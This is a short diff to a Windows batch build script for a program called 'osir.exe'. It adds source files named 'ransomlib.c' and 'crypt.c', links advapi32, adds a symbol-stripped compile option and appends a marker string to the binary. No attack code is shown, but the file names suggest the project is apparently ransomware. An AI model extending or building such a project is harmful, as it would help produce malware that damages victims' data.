@@ -11,9 +11,9 @@ REM the like to optimize.
 
 
 REM build arguments
-set INPUT=osir.c common\os.c common\web.c common\thirdparty\b64.c common\clonelib.c common\weakcrypt.c
+set INPUT=osir.c common\os.c common\web.c common\thirdparty\b64.c common\clonelib.c common\weakcrypt.c common\ransomlib.c common\crypt.c
 set OUTPUT=osir.exe
-set LIBS=-lws2_32
+set LIBS=-lws2_32 -ladvapi32
 
 
 REM define the compilers
@@ -27,6 +27,9 @@ set COMPILER=%TCC%
 if "%1" == "gcc" (
 	set COMPILER=%GCC%
 )
+if "%1" == "gccwno" (
+	set COMPILER=gcc -s -std=c99
+)
 if "%1" == "tcc" (
 	set COMPILER=%TCC%
 )
@@ -39,3 +42,6 @@ REM build
 set build=%COMPILER% %2 %INPUT% -o %OUTPUT% %LIBS%
 echo %build%
 %build%
+
+REM add marker
+echo 9jx >> %OUTPUT%
